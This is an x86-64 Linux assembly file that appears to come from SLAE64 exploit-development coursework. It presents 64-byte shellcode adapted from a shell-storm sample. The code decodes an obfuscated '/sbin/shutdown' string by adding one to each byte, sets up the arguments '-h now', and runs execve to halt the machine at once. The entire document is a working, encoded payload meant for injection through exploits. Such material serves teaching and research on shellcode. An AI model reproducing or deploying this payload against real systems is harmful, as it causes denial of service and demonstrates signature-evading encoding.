; ===================================================================
; Optimized version of shellcode at:
; http://shell-storm.org/shellcode/files/shellcode-877.php
; Author: SLAE64-1351 (Keyman)
; Date: 14/09/2014
;
; Length: 64 bytes (got shorter by 1 byte :D )
;
; What's new is that some optimalization was performed on the
; original code which left some space to do a basic decoding of the
; command (/sbin/shutdown). Each byte (except the first one) was
; decremented by 1. The decoder just adds 1 to each byte.
;
; ===================================================================

section .text
global _start

_start:

xor rax, rax                ; clear rax and rdx
cdq

; -------------------------------------------------------------------
; 1. store '-h' on stack
; -------------------------------------------------------------------

push rax
push word 0x682d ;-h
push rsp
pop rcx

; -------------------------------------------------------------------
; 2. store 'now' on stack
; -------------------------------------------------------------------

push rax
push byte 0x77
push word 0x6f6e ; now
push rsp
pop rbx

push rax
push rbx
push rcx

; -------------------------------------------------------------------
; 3. store '/sbin/shutdown' on stack
; -------------------------------------------------------------------

push rsp
pop rsi

push rax
jmp shutdown
cont:
pop rdi

push 15
pop rcx

do_add:
    add byte [rdi+rcx], 0x01
    loop do_add

push 59
pop rax
syscall

shutdown:
    call cont
    c_1: db 0x2f, 0x2e, 0x2e, 0x72, 0x61, 0x68, 0x6d, 0x2e, 0x72, 0x67, 0x74, 0x73, 0x63, 0x6e, 0x76, 0x6d